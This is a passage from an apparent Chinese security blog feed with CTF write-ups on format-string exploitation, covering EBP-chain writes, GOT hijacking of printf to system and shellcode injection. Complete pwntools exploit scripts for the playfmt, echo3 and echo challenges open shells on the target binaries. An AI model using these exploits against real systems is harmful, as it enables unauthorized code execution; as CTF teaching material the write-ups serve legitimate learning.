href="#劫持-stack-chk-fail" class="headerlink" title="劫持__stack_chk_fail"></a>劫持<code>__stack_chk_fail</code></h4><ul><li>在无法 stack overflow 也没有其它函数可以劫持时，可以使用修改<code>__stack_chk_fail</code> 的 G0T 并且破坏 canary 使这个函数被call，然后jmp想要的目标地址</li><li>在只有一次 stack overflow+fmt 时可以将<code>__stack_chk_fail</code>改成直接ret ，这样stack overflow 时可以无视canary ，也可以放上ROP链，进而进入之后的ROP。</li></ul><h2 id="格式化字符串不在栈上"><a href="#格式化字符串不在栈上" class="headerlink" title="格式化字符串不在栈上"></a>格式化字符串不在栈上</h2><p>有时候并不会这么刚好 format string 的 buf 在栈上当其在 data, bss 或是 heap 上的情况，无法在 stack 中放上一个 address 给任意读写的时候，可以使用在  stack 上现有的 pointer 进行写值。其中最常用的就是栈上现有的EBP链。</p><h3 id="EBP链"><a href="#EBP链" class="headerlink" title="EBP链"></a>EBP链</h3><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y9ykIj.png" srcset="/img/loading.gif" alt></p><p>正如这个图，当一个程序完成了由main—&gt;A—&gt;B的函数调用，栈上就会存在一个EBP链，像图中的ebp3(B)—&gt;ebp2(A)—&gt;ebp1(main)，然后</p><ul><li>通过找准offset1(算一下ebp3与fmt字符串距离)对EBP2使用%hhn，就可以修改到EBP1的最低位，使得EBP1在一个256的范围内进行变化，可以改成你想要修改的栈内存单元指针（比如ret address的栈指针）。</li><li>改写好EBP1后，找准offset2 (算一下EBP2与fmt字符串距离)再对EBP1使用%hhn或者%hn，即可完成对你想要修改的地址的写值。</li></ul><p>简单来说，这个攻击过程就是第一次使用漏洞是构造出我们要读写的地址，再一次则是对前面构造出来的地址进行任意读写。但需要注意的是，<strong>在这个过程当中一定要学会对栈上的已有数据的灵活的运用</strong>。</p><p>接下来看一个题来仔细分析一下</p><h4 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining-playfmt"></a>hitcontraining-playfmt</h4><h5 id="保护和arch-3"><a href="#保护和arch-3" class="headerlink" title="保护和arch"></a>保护和arch</h5><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">disabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span><span class="hljs-attr">RWX:</span>      <span class="hljs-string">Has</span> <span class="hljs-string">RWX</span> <span class="hljs-string">segments</span></code></pre></div><p>没有任何保护。</p><h5 id="ida分析-3"><a href="#ida分析-3" class="headerlink" title="ida分析"></a>ida分析</h5><div class="hljs"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">do_fmt</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">int</span> result; <span class="hljs-comment">// eax</span>  <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )  &#123;    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0xC8</span>u);    result = <span class="hljs-built_in">strncmp</span>(buf, <span class="hljs-string">"quit"</span>, <span class="hljs-number">4u</span>);    <span class="hljs-keyword">if</span> ( !result )      <span class="hljs-keyword">break</span>;    <span class="hljs-built_in">printf</span>(buf);  &#125;  <span class="hljs-keyword">return</span> result;&#125;</code></pre></div><p>其中看到buf在bss段：<br><img src="http://qiqianyun.chumen77.xyz/uPic/HRvwJA.png" srcset="/img/loading.gif" alt><br>这就是不在栈上，不能跟前面的题目一样，直接在栈上写上地址，然后来完成攻击。</p><p>上层有main 和play函数，一共三层，且在第三层的do-fmt函数存在格式化字符串漏洞，让我们很方便的用ebp链来完成攻击。然后，有无限次的触发这个漏洞的机会。</p><p>攻击思路 ：因为没有开nx保护，可以用shellcode进行攻击。修改某个函数返回地址，然后提前在可控的buf合适的地方摆上shellcode，然后跳上去即可。</p><h5 id="gdb调试-2"><a href="#gdb调试-2" class="headerlink" title="gdb调试"></a>gdb调试</h5><p>定位到printf函数处：</p><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ b *<span class="hljs-number">0x0804854F</span>Breakpoint <span class="hljs-number">1</span> at <span class="hljs-number">0x804854f</span></code></pre></div><p>可以看一下此时的栈情况：<br><img src="http://qiqianyun.chumen77.xyz/uPic/lYT98n.png" srcset="/img/loading.gif" alt><br>esp寄存器：<br><img src="http://qiqianyun.chumen77.xyz/uPic/vpsR9A.png" srcset="/img/loading.gif" alt><br>这里就把<code>0xffffd338</code>叫做ebp3，<code>0xffffd348</code>为ebp2，<code>0xffffd358</code>为ebp1。</p><p>第一次修改：对ebp2使用<code>%xxhhn</code>修改ebp1为do-fmt函数的retaddr <code>0xffffd33c</code>的<strong>栈指针</strong>（这个栈指针可以通过leak一个栈地址，然后根据偏移算出来）</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/x0EjmA.png" srcset="/img/loading.gif" alt></p><p>第二次修改 ： 对ebp1使用<code>%xxhn</code> 修改retaddr <code>0x80485ad</code> 为你在buf处提前摆上的shellcode</p><p>这样程序在退出这个do-fmt函数就会jmp到shellcode上，这样就拿到shell了。</p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timecontext.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span>io = process(<span class="hljs-string">'./ebp'</span>)<span class="hljs-comment"># io = remote('node3.buuoj.cn',29994)</span>buf = <span class="hljs-number">0x0804a080</span> + <span class="hljs-number">0x40</span> <span class="hljs-comment">#0x804a0c0</span>raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(<span class="hljs-string">'%4$p'</span>)ret_stack_addr = int(io.recv(<span class="hljs-number">10</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">28</span>print(<span class="hljs-string">'leak ret_stack_addr:'</span>+hex(ret_stack_addr))key1 = int(str(hex(ret_stack_addr))[<span class="hljs-number">-2</span>:],<span class="hljs-number">16</span>)key2 = <span class="hljs-number">0xa0c0</span>payload = <span class="hljs-string">'%&#123;&#125;c%4$hhn'</span>.format(key1)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.recv()payload = <span class="hljs-string">'%&#123;&#125;c%12$hn'</span>.format(key2)payload = payload.ljust(<span class="hljs-number">0x40</span>) payload +=  asm(shellcraft.sh())io.sendline(payload)io.interactive()</code></pre></div><p>这个题目就是很单纯的直接利用ebp链进行攻击即可。</p><p>然后再看一个有点不一样的题目：</p><h3 id="inndy-echo3"><a href="#inndy-echo3" class="headerlink" title="inndy-echo3"></a>inndy-echo3</h3><h4 id="保护和arch-4"><a href="#保护和arch-4" class="headerlink" title="保护和arch"></a>保护和arch</h4><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">Stack:</span>    <span class="hljs-string">Canary</span> <span class="hljs-string">found</span><span class="hljs-attr">NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h4 id="ida分析-4"><a href="#ida分析-4" class="headerlink" title="ida分析"></a>ida分析</h4><p><img src="http://qiqianyun.chumen77.xyz/uPic/Z7hCmN.png" srcset="/img/loading.gif" alt><br><img src="http://qiqianyun.chumen77.xyz/uPic/OawGHm.png" srcset="/img/loading.gif" alt></p><p>这一处会让栈结构的情况变得无法预测。然后进入hardfmt：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt;= <span class="hljs-number">4</span>; ++i )&#123;  read(<span class="hljs-number">0</span>, buff, <span class="hljs-number">0x1000</span>u);  <span class="hljs-built_in">printf</span>(buff);&#125;</code></pre></div><p>这一处存在fmt漏洞，且往下看整个程序感觉没什么好利用的，没什么后门函数。那攻击思路就可以是：<strong>改printf的got表，然后在第5次传过去<code>/bin/sh</code>即可。</strong><br>（这个题目思路还是很简单的，但是栈的随机化，还有因为这个次数的限制，在实际操作过程中，要充分的利用每一次格式化字符串漏洞，让这个题目不是很容易做）</p><h4 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h4><p>定位到漏洞printf函数处：<br><img src="http://qiqianyun.chumen77.xyz/uPic/KPo7Ve.png" srcset="/img/loading.gif" alt><br>会发现这个情况是没有<strong>构成ebp链</strong>的，这个时候就需要咱们自己来仔细观察栈上的数据，然后来挑选合适的栈数据来进行利用。</p><p>因为栈情况不一样，可以选择最适合我们利用漏洞的栈空间来进行分析，这样做起来会简单一些。</p><p>我自己选择在偏移在43的时候开始进行分析，想办法来利用这个漏洞：<br><img src="http://qiqianyun.chumen77.xyz/uPic/8gciU0.png" srcset="/img/loading.gif" alt><br>仔细看下此时的栈情况 ，然后再次仔细分析下我们的目标 ：</p><ul><li>泄漏libc基址，计算出system的内存地址。</li><li>在栈上构造出printf的got地址和printf的got+2的地址（0x0804a014和0x0804a016）</li><li>在构造的got地址上，开始写system地址<br>由于这个漏洞可以的用的次数最多是4次，所以要尽可能利用每一次。</li></ul><p>如上图所示，很简单就可以泄漏出libc基址。<br>但是接下来怎么构造printf的got地址和printf的got地址+2的地址就有点难了。</p><p>此时注意图上前两个红框，可以发现把前二个红框<strong>虽不是ebp</strong>的链，但是这也是<strong>成一个链</strong>可以利用了。然后可以把第二个红框的两个地址修改为 第一个红框的两个栈指针：</p><p>这里可以用gdb直接来手动设置，让咱们上来就写exp调试还是挺费劲的：</p><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5e6c = 0xffbe5d54gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5e64 = 0xffbe5d60</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/KIrnCk.png" srcset="/img/loading.gif" alt></p><p>这个过程中在泄漏目标栈地址以后，是可以通过一次printf函数写入2次地址，实现这个栈情况的。</p><p>接着就可以构造got地址和got+2地址：</p><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5d60  = 0x0804a016gdb-peda$ <span class="hljs-builtin-name">set</span> <span class="hljs-number">*0</span>xffbe5d54  = 0x0804a014</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/hma5RY.png" srcset="/img/loading.gif" alt></p><p>然后就可以利用对got地址和got+2地址使用<code>%xhn</code>,写system的内存地址上printf的got了：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-number">0120</span>| <span class="hljs-number">0xffbe5d88</span> --&gt; <span class="hljs-number">0xffbe5e6c</span> --&gt; <span class="hljs-number">0xffbe5d54</span> --&gt; <span class="hljs-number">0x804a014</span> --&gt; <span class="hljs-number">0xf7e0cda0</span> (&lt;__libc_system&gt;:<span class="hljs-keyword">sub</span>    <span class="hljs-built_in">esp</span>,<span class="hljs-number">0xc</span>)</code></pre></div><p>写好以后，再传过去一下<code>/bin/sh</code>即可。</p><h4 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h4><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch =<span class="hljs-string">'i386'</span><span class="hljs-keyword">import</span> timeelf = ELF(<span class="hljs-string">'./echo3'</span>)debug = <span class="hljs-number">1</span><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:    <span class="hljs-keyword">if</span> debug :        io = process(<span class="hljs-string">'./echo3'</span>)        libc = elf.libc    <span class="hljs-keyword">else</span>:        io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">25057</span>)        libc = ELF(<span class="hljs-string">'./libc-2.23.so.i386'</span>)    payload = <span class="hljs-string">'%43$pA%30$pA%47$p'</span>    io.sendline(payload)    address = io.recvline().strip()    <span class="hljs-keyword">if</span> address[<span class="hljs-number">-3</span>:] == <span class="hljs-string">'637'</span>:        <span class="hljs-keyword">if</span> address[<span class="hljs-number">7</span>:<span class="hljs-number">10</span>] == <span class="hljs-string">'637'</span>:            libc_base = int(address[<span class="hljs-number">2</span>:<span class="hljs-number">10</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">247</span> - libc.symbols[<span class="hljs-string">'__libc_start_main'</span>]            tag1_stack_point = int(address[<span class="hljs-number">13</span>:<span class="hljs-number">21</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">0x118</span>            tag2_stack_point = int(address[<span class="hljs-number">13</span>:<span class="hljs-number">21</span>],<span class="hljs-number">16</span>) - <span class="hljs-number">0x104</span> - <span class="hljs-number">0x8</span>            system_addr = libc_base + libc.symbols[<span class="hljs-string">'system'</span>]            print(<span class="hljs-string">'system_addr  -&gt;'</span> + hex(system_addr))            print(<span class="hljs-string">'tag1_stack_point -&gt;'</span> + hex(tag1_stack_point))            print(<span class="hljs-string">'tag2_stack_point -&gt;'</span> + hex(tag2_stack_point))            <span class="hljs-keyword">break</span>    <span class="hljs-keyword">else</span> :        io.close()        <span class="hljs-keyword">continue</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtshort</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> result<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmtbyte</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">1</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hhn"</span>    <span class="hljs-keyword">return</span> resultprintf_got = <span class="hljs-number">0x0804a014</span>key1 = int(hex(tag1_stack_point)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)key2 = int(hex(tag2_stack_point)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)info(<span class="hljs-string">'--------change the two points to tag_stack_point:-------'</span>)<span class="hljs-comment"># raw_input('-&gt;')</span>prev = <span class="hljs-number">0</span>payload = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key1 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">30</span>+i)     prev = (key1 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key2 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">31</span>+i)     prev = (key2 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload + <span class="hljs-string">'1111'</span>io.sendline(payload)io.recvuntil(<span class="hljs-string">'1111'</span>)info(<span class="hljs-string">'--------change got_table to printf_got:-------'</span>)prev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key3 = <span class="hljs-number">0x14</span>key4 = <span class="hljs-number">0x16</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtbyte(prev,(key3 &gt;&gt; <span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xff</span>,<span class="hljs-number">87</span>+i)     prev = (key3 &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtbyte(prev,(key4 &gt;&gt; <span class="hljs-number">8</span>*i) &amp; <span class="hljs-number">0xff</span>,<span class="hljs-number">85</span>+i)     prev = (key4 &gt;&gt; i*<span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xff</span>payload = payload + <span class="hljs-string">'2222'</span>io.sendline(payload)io.recvuntil(<span class="hljs-string">'2222'</span>)info(<span class="hljs-string">'--------change printf_got to system_addr:-------'</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)prev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key5 = int(hex(system_addr)[<span class="hljs-number">-4</span>:],<span class="hljs-number">16</span>)key6 = int(hex(system_addr)[<span class="hljs-number">2</span>:<span class="hljs-number">6</span>],<span class="hljs-number">16</span>)print(<span class="hljs-string">'key5 -&gt; '</span> + hex(key5))print(<span class="hljs-string">'key6 -&gt; '</span> + hex(key6))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key5 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">17</span>+i)     prev = (key5 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>):    payload +=fmtshort(prev,(key6 &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">20</span>+i)     prev = (key6 &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload + <span class="hljs-string">'3333'</span>io.sendline(payload)sleep(<span class="hljs-number">1</span>)io.recvuntil(<span class="hljs-string">'3333'</span>)raw_input(<span class="hljs-string">'&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;'</span>)io.sendline(<span class="hljs-string">'/bin/sh\x00\x00\x00\x00\x00\x00'</span>)io.interactive()</code></pre></div><p>这个exp的难点在于：</p><ul><li>注意去定位到合适的栈结构再去利用</li><li>尽量充分利用每一次的printf</li><li>单次printf多次写入</li><li>注意每次传数据过去后，一定要接收一下，并且再一次的数据读入要防止bss上的缓冲区里面参杂数据的影响。</li></ul><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>通过这两个例题说明，面对fmt的buf不在栈上时，归根结底也就是一定要学会<strong>灵活、充分的利用栈上的数据</strong>,单纯的ebp链只是适合简单的情况。</p><p>但是也是做题时，也是一定要优先考虑ebp链是否能利用，因为ebp链构成的话，它的相对偏移就是<strong>针对性程序本身的</strong>，基本不会受到libc版本的影响，用起来很好用，要优先考虑。</p><p>还有就是面对这种会<strong>有随机栈情况、没有ebp链</strong>的题目，一定要注意本地和远程的libc版本、注意环境,因为这些不一样导致栈的情况也是不一样的，导致exp也要有相应的变化。</p>]]></content>
    
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>学习记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>格式化字符串漏洞题目练习</title>
    <link href="/2020/03/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/03/15/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞题目练习"><a href="#格式化字符串漏洞题目练习" class="headerlink" title="格式化字符串漏洞题目练习"></a>格式化字符串漏洞题目练习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>整合一下最近做的格式化字符串题目的练习，把wp给写一下，方便对总结对这个漏洞的利用套路和技巧。</p><h2 id="inndy-echo"><a href="#inndy-echo" class="headerlink" title="inndy_echo"></a>inndy_echo</h2><h3 id="保护和arch"><a href="#保护和arch" class="headerlink" title="保护和arch"></a>保护和arch</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-string">[*]</span> <span class="hljs-string">'/media/psf/mypwn2/buuctf/inndy_echo/echo'</span><span class="hljs-attr">    Arch:</span>     <span class="hljs-string">i386-32-little</span><span class="hljs-attr">    RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr">    Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr">    NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr">    PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x8048000)</span></code></pre></div><h3 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h3><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">int</span> __cdecl __<span class="hljs-function">noreturn <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span>&#123;  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [esp+Ch] [ebp-10Ch]</span>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [esp+10Ch] [ebp-Ch]</span>  v4 = __readgsdword(<span class="hljs-number">0x14</span>u);  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);  <span class="hljs-keyword">do</span>  &#123;    fgets(&amp;s, <span class="hljs-number">256</span>, <span class="hljs-built_in">stdin</span>);    <span class="hljs-built_in">printf</span>(&amp;s);  &#125;  <span class="hljs-keyword">while</span> ( <span class="hljs-built_in">strcmp</span>(&amp;s, <span class="hljs-string">"exit\n"</span>) );  system(<span class="hljs-string">"echo Goodbye"</span>);  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);&#125;</code></pre></div><p>可以看到会无限的打印你输入的东西，并且有system这个函数，利用思路也就是GOT hijack，把printf函数的got改为system的plt，注意要单次printf多次写入，改为system的plt后，再传过去<code>/bin/sh</code>，此时就会变成<code>system(/bin/sh)</code></p><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><div class="hljs"><pre><code class="hljs undefined">gdb-peda$ stack <span class="hljs-number">0x20</span><span class="hljs-number">0000</span>| <span class="hljs-number">0xffffd250</span> --&gt; <span class="hljs-number">0xffffd26c</span> (<span class="hljs-string">"AAAA<span class="hljs-subst">\n</span>"</span>)<span class="hljs-number">0004</span>| <span class="hljs-number">0xffffd254</span> --&gt; <span class="hljs-number">0x100</span><span class="hljs-number">0008</span>| <span class="hljs-number">0xffffd258</span> --&gt; <span class="hljs-number">0xf7fb25a0</span> --&gt; <span class="hljs-number">0xfbad208b</span><span class="hljs-number">0012</span>| <span class="hljs-number">0xffffd25c</span> --&gt; <span class="hljs-number">0x0</span><span class="hljs-number">0016</span>| <span class="hljs-number">0xffffd260</span> --&gt; <span class="hljs-number">0xf7ffd000</span> --&gt; <span class="hljs-number">0x23f40</span><span class="hljs-number">0020</span>| <span class="hljs-number">0xffffd264</span> --&gt; <span class="hljs-number">0x80482e7</span> (<span class="hljs-string">"__libc_start_main"</span>)<span class="hljs-number">0024</span>| <span class="hljs-number">0xffffd268</span> --&gt; <span class="hljs-number">0xf63d4e2e</span><span class="hljs-number">0028</span>| <span class="hljs-number">0xffffd26c</span> (<span class="hljs-string">"AAAA<span class="hljs-subst">\n</span>"</span>)</code></pre></div><div class="hljs"><pre><code class="hljs c">gdb-peda$ fmtarg <span class="hljs-number">0xffffd26c</span>The index of format argument : <span class="hljs-number">7</span> (<span class="hljs-string">"\%6$p"</span>)</code></pre></div><p>确定偏移是7，打算一会写payload时候需要补齐，就<code>.ljust</code>补成0x20的，也就是<code>offset = 7 + 0x20/4 = 15</code></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span><span class="hljs-comment"># io = process('./echo')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26990</span>)system_plt = <span class="hljs-number">0x08048400</span>printf_got = <span class="hljs-number">0x0804A010</span><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">0</span> payload = <span class="hljs-string">""</span>key = <span class="hljs-number">0x08048400</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>):    payload +=fmt_short(prev,(key &gt;&gt; <span class="hljs-number">16</span>*i) &amp; <span class="hljs-number">0xffff</span>,<span class="hljs-number">15</span>+i)     prev = (key &gt;&gt; i*<span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffff</span>payload = payload.ljust(<span class="hljs-number">0x20</span>,<span class="hljs-string">'a'</span>) + p32(printf_got) + p32(printf_got+<span class="hljs-number">2</span>)raw_input(<span class="hljs-string">'-&gt;'</span>)io.sendline(payload)io.send(<span class="hljs-string">'/bin/sh\x00'</span>)io.interactive()</code></pre></div><p>换一种就是用pwntools模块，面对32位，这种情况还是很好用的：</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *context.log_level = <span class="hljs-string">'debug'</span>context.arch = <span class="hljs-string">'i386'</span><span class="hljs-comment"># io = process('./echo')</span>io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">26990</span>)system_plt = <span class="hljs-number">0x08048400</span>printf_got = <span class="hljs-number">0x0804A010</span>payload = fmtstr_payload(<span class="hljs-number">7</span>,&#123;printf_got : system_plt&#125;)io.sendline(payload)io.send(<span class="hljs-string">'/bin/sh\x00'</span>)io.interactive()</code></pre></div><div class="hljs"><pre><code class="hljs c">[DEBUG] Sent <span class="hljs-number">0x3c</span> bytes:    <span class="hljs-number">00000000</span>  <span class="hljs-number">10</span> a0 <span class="hljs-number">04</span> <span class="hljs-number">08</span>  <span class="hljs-number">11</span> a0 <span class="hljs-number">04</span> <span class="hljs-number">08</span>  <span class="hljs-number">12</span> a0 <span class="hljs-number">04</span> <span class="hljs-number">08</span>  <span class="hljs-number">13</span> a0 <span class="hljs-number">04</span> <span class="hljs-number">08</span>  │····│····│····│····│    <span class="hljs-number">00000010</span>  <span class="hljs-number">25</span> <span class="hljs-number">32</span> <span class="hljs-number">34</span> <span class="hljs-number">30</span>  <span class="hljs-number">63</span> <span class="hljs-number">25</span> <span class="hljs-number">37</span> <span class="hljs-number">24</span>  <span class="hljs-number">68</span> <span class="hljs-number">68</span> <span class="hljs-number">6</span>e <span class="hljs-number">25</span>  <span class="hljs-number">31</span> <span class="hljs-number">33</span> <span class="hljs-number">32</span> <span class="hljs-number">63</span>  │%<span class="hljs-number">240</span>│c%<span class="hljs-number">7</span>$│hhn%│<span class="hljs-number">132</span>c│    <span class="hljs-number">00000020</span>  <span class="hljs-number">25</span> <span class="hljs-number">38</span> <span class="hljs-number">24</span> <span class="hljs-number">68</span>  <span class="hljs-number">68</span> <span class="hljs-number">6</span>e <span class="hljs-number">25</span> <span class="hljs-number">31</span>  <span class="hljs-number">32</span> <span class="hljs-number">38</span> <span class="hljs-number">63</span> <span class="hljs-number">25</span>  <span class="hljs-number">39</span> <span class="hljs-number">24</span> <span 